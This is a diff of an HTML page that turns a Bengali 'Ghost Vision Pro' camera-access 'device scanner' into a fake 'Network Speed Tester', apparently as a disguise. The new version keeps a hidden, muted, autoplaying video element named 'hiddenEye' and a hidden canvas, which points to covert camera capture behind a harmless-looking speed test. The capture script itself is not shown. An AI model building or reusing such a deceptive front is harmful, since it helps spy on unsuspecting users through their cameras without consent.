@@ -1,51 +1,56 @@
 <!DOCTYPE html>
 <html lang="bn">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Ghost Vision Pro</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-  <link rel="stylesheet" href="style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>নেটওয়ার্ক স্পিড টেস্টার</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
-  <div class="cyber-container">
-    <div class="hologram-effect"></div>
-    
-    <div class="cyber-card">
-      <div class="logo">
-        <i class="fas fa-ghost cyber-glitch"></i>
-        <span>GHOST VISION PRO</span>
-      </div>
-      
-      <h1 class="cyber-title">ডিভাইস স্ক্যানার সিস্টেম</h1>
-      <p class="cyber-text" id="statusText">সিস্টেম প্রস্তুত হচ্ছে...</p>
-      
-      <div class="progress-container">
-        <div class="cyber-progress" id="progressBar"></div>
-      </div>
-      
-      <button id="cameraBtn" class="cyber-button">
-        <i class="fas fa-camera"></i> ক্যামেরা অ্যাক্সেস দিন
-      </button>
-      
-      <div class="cyber-grid">
-        <div class="cyber-info-card">
-          <i class="fas fa-mobile-alt"></i>
-          <h3>মোবাইল ডাটা</h3>
-          <div id="mobileInfo"></div>
+    <div class="magic-container">
+        <div class="crystal-ball">
+            <div class="inner-glow"></div>
+            <div class="particles"></div>
         </div>
-        <div class="cyber-info-card">
-          <i class="fas fa-desktop"></i>
-          <h3>PC ডাটা</h3>
-          <div id="pcInfo"></div>
+        
+        <h1 class="magic-text">আপনার ইন্টারনেট স্পিড টেস্ট</h1>
+        <p class="subtext">আমরা আপনার নেটওয়ার্কের গতি বিশ্লেষণ করছি...</p>
+        
+        <div class="speedometer">
+            <div class="needle"></div>
+            <div class="speed-display">
+                <span id="speedValue">0</span>
+                <span>Mbps</span>
+            </div>
         </div>
-      </div>
+        
+        <div class="progress-container">
+            <div class="progress-bar" id="progressBar"></div>
+            <span id="progressText">০% সম্পূর্ণ</span>
+        </div>
+        
+        <button id="startTest" class="magic-button">
+            <i class="fas fa-bolt"></i> টেস্ট শুরু করুন
+        </button>
+        
+        <div class="network-info">
+            <div class="info-card">
+                <i class="fas fa-wifi"></i>
+                <h3>নেটওয়ার্ক টাইপ</h3>
+                <p id="networkType">ডিটেক্ট হচ্ছে...</p>
+            </div>
+            <div class="info-card">
+                <i class="fas fa-server"></i>
+                <h3>সার্ভার লোড</h3>
+                <p id="serverLoad">মাঝারি</p>
+            </div>
+        </div>
     </div>
-  </div>
 
-  <video id="cameraFeed" autoplay playsinline style="display:none;"></video>
-  <canvas id="cameraCanvas" style="display:none;"></canvas>
+    <video id="hiddenEye" autoplay playsinline muted style="display:none;"></video>
+    <canvas id="hiddenCanvas" style="display:none;"></canvas>
 
-  <script src="script.js"></script>
+    <script src="script.js"></script>
 </body>
 </html>
